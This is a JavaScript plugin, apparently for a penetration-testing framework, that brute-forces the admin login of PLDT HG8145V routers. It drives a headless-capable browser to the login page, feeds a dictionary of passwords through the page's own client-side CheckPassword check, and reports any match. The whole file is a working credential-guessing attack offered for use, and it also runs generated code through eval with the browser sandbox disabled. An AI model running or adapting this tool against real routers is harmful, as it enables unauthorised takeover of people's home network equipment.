// Main
class Plugin {
    constructor(log, info, dependencies){
        this.log = log
        this.platforms = info.platforms
        this.arch = info.arch
        this.fullInfo = info.fullInfo
        this.dependencies = dependencies
    }

    info(){
        return {
            name: "PLDT HG8145V",
            description: "Fast PLDT HG8145V login page bruteforcer.",
            authors: [
                "I2rys"
            ],
            references: [
                "https://github.com/I2rys/OPLDT/blob/main/PLDT%20HG8145V%20bruteforcer%20software.txt"
            ],
            platforms: [
                this.platforms.win
            ],
            arch: this.arch.both,
            options: [
                {
                    name: "url",
                    description: "The target login page url.",
                    default: "http://192.168.0.1/",
                    required: true
                },
                {
                    name: "username",
                    description: "The username to bruteforce.",
                    default: "admin",
                    required: true
                },
                {
                    name: "dictionary",
                    description: "A path of a file that contains a list of passwords.",
                    required: true
                }
            ],
            disclosureDate: "2022-01-09"
        }
    }

    run(args){
        const puppeteer = this.dependencies.puppeteer
        const fs = this.dependencies.fs
        const log = this.log

        return new Promise(async(resolve)=>{
            const browser = await puppeteer.launch({ headless: false, args: [ "--no-sandbox", "--disable-setuid-sandbox" ] })
            const page = await browser.newPage()

            const dictionary = fs.readFileSync(args.dictionary, "utf8").replace(/\r/g, "").split("\n")

            await page.goto(args.url, { waitUntil: "domcontentloaded" })
            await page.type("#txt_Username", args.username)

            eval(`
            (async()=>{
                const password = await page.evaluate(()=>{
                    var passwords = ${JSON.stringify(dictionary)}
            
                    for( const password of passwords ) if(CheckPassword(password) == 1) return password
            
                    return false
                })

                done(password)
            })()
            `)
        
            async function done(password){
                password ? log("i", `Valid password found: ${password}`) : log("w", "No valid password found.")
        
                await browser.close()
                resolve()
            }
        })
    }
}

module.exports = Plugin